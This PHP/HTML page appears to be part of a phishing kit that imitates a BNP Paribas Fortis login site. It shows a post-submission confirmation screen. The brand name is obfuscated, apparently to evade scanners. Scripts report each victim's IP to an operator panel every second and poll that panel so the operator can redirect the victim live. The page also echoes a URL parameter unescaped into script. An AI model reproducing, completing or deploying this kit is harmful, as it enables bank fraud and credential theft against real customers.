<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
<div class="holder">
<div class="back">
</div>
<div class="logo">
<div class="mklogo">
    <div class="mkimg">
        <img src="res/log.png">
    </div>
    <div class="mktext">
    <?php $bm->obf("BNP PARIBAS"); ?>
        <div class="liner"></div>
        <?php $bm->obf("FORTIS"); ?>
    </div>
</div>
</div>
<div class="easy">
<?php echo getLang("_easy"); ?>
</div>
</div>
</header>

<main>

<div class="form">

<div class="left">
<div class="welcome">
<h3><?php echo getLang("_welcomes")[0]; ?></h3>
    <h1><?php echo getLang("_welcomes")[1]; ?></h1>
</div>
</div>


<div class="right">

<div class="col" style="padding:50px 0; text-align:center; font-family:'sans';">
<?php echo getLang("_done")[0]; ?><br><br>
<img src="res/valid.png" style="width:50px;"><br><br>
<?php echo getLang("_done")[1]; ?>
</div>


</div>

</div>


<div class="help">
    <div class="help-text"><img src="res/phone.png"> <?php echo getLang("_help")[0]; ?></div><br>
    <a href="#"> <?php echo getLang("_help")[1]; ?></a>
</div>

</main>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
setTimeout(() => {
    window.location="exit.php";
}, 15000);

setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d){
            window.location=d;
        }
    })

}, 2000);
</script>
</body>
</html>